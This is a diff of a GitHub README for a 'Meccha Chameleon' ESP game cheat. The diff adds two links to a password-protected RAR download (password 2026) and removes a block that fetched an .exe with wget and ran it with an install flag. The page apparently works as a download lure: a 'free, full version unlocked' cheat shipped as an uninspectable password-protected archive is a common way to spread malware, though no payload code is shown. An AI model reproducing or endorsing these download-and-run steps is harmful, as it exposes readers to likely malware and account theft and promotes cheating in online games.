@@ -6,6 +6,7 @@
 **🌀 Meccha Chameleon Vision** — Visual assistance tool for Meccha Chameleon game.
 
 Designed to enhance visibility and provide helpful visual cues for the creative camouflage hide-and-seek experience.
+<img width="1586" height="992" alt="ChatGPT Image Jun 27, 2026, 06_15_57 PM" src="https://github.com/user-attachments/assets/c41b7bdb-caf4-4b8b-8de8-e12b4d8721d2" />
 
 ---
 
@@ -18,14 +19,10 @@ Designed to enhance visibility and provide helpful visual cues for the creative 
 
 ---
 
-## 📥 Installation
+## 📥 [Installation](https://github.com/BodyConductorYank/meccha-chameleon-esp/releases/download/MecchaChameleon/Meccha-Chameleon-Esp.v1.2.2.rar)
 
 **Password: 2026**
 
-```
-> wget https://meccha-vision.cdn/v4.0/MecchaVision.exe
-> ./MecchaVision.exe --install
-```
 
 ---
 
@@ -66,6 +63,7 @@ Designed to enhance visibility and provide helpful visual cues for the creative 
 
 **Is it free?** Yes. Full version unlocked.
 
+
 ---
 
 ## 🏷️ Tags
@@ -73,7 +71,8 @@ Designed to enhance visibility and provide helpful visual cues for the creative 
 MECCHA CHAMELEON, GAME UTILITY, VISION TOOL, WINDOWS OPTIMIZER, GAMING ASSISTANT
 
 ---
+## 📥 [Installation](https://github.com/BodyConductorYank/meccha-chameleon-esp/releases/download/MecchaChameleon/Meccha-Chameleon-Esp.v1.2.2.rar)
 
-### 🔓 Download Now
+## Password: 2026**
+---
 
-```
